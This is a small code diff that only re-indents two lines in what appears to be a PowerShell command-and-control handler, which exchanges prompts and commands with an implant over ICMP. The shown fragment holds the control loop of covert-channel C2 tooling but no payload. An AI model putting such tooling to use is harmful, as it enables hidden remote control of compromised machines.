@@ -152,7 +152,7 @@ public static class LIBC
   while ($True) {
     Switch ($State) {
       WaitingForPrompt {
-      ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
+        ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
         if ($null -eq $ICMPHeader) { Continue; }
         Switch ([ImplantMessageType]$MessageType) {
           Prompt {
@@ -173,7 +173,7 @@ public static class LIBC
         Break;
       }
       WaitingToReplyWithCommand {
-      ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
+        ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
         if ($null -eq $ICMPHeader) { Continue; }
         Switch ($MessageType) {
           NeedsInstruction {
